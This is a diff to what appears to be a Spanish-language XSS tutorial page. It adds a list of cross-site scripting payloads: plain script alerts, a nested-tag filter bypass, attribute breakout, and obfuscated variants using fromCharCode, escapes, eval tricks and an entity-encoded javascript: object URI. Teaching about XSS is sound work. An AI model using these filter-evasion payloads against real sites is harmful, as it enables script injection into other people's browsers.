@@ -37,7 +37,11 @@
 
 <p>La primera forma es agregar un script a la variable y ver si no es filtrado y pueda ejecutar javascript en nuestro navegador, eso abre la puerta a muchos otros ataques como los listados anteriormente. El codigo generalmente es el siguiente <strong>&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;</strong> aunque existen formas mas complejas de ofuscar codigo javascript para entender xss es un buen ejemplo.</p>
 
-<p>Si cambiamos el valor de la variable<strong>usuario</strong> por una carga xss podriamos ejecutar javascript en la pagina y veriamos una alerta javascript</p>
+<p>Si cambiamos el valor de la variable<strong>usuario</strong> por una carga xss podriamos ejecutar javascript en la pagina y veriamos una alerta javascript. Algunos de formas de explotacion serian:</p>
+
+<pre>&lt;script&gt;alert&lpar;&apos;XSS&apos;&rpar;&lt;&sol;script&gt;&NewLine;&lt;scr&lt;script&gt;ipt&gt;alert&lpar;&apos;XSS&apos;&rpar;&lt;&sol;scr&lt;script&gt;ipt&gt;&NewLine;&quot;&gt;&lt;script&gt;alert&lpar;&apos;XSS&apos;&rpar;&lt;&sol;script&gt;&NewLine;&quot;&gt;&lt;script&gt;alert&lpar;String&period;fromCharCode&lpar;88&comma;83&comma;83&rpar;&rpar;&lt;&sol;script&gt;&NewLine;&lt;script&gt;&bsol;u0061lert&lpar;&apos;22&apos;&rpar;&lt;&sol;script&gt;&NewLine;&lt;script&gt;eval&lpar;&apos;&bsol;x61lert&lpar;&bsol;&apos;33&bsol;&apos;&rpar;&apos;&rpar;&lt;&sol;script&gt;&NewLine;&lt;script&gt;eval&lpar;8680439&period;&period;toString&lpar;30&rpar;&rpar;&lpar;983801&period;&period;toString&lpar;36&rpar;&rpar;&lt;&sol;script&gt; &sol;&sol;parseInt&lpar;&quot;confirm&quot;&comma;30&rpar; &equals;&equals; 8680439 &amp;&amp; 8680439&period;&period;toString&lpar;30&rpar; &equals;&equals; &quot;confirm&quot;&NewLine;&lt;object&sol;data&equals;&quot;jav&amp;&num;x61&semi;sc&amp;&num;x72&semi;ipt&amp;&num;x3a&semi;al&amp;&num;x65&semi;rt&amp;&num;x28&semi;23&amp;&num;x29&semi;&quot;&gt;</pre>
+
+
 
 <p></p>
 
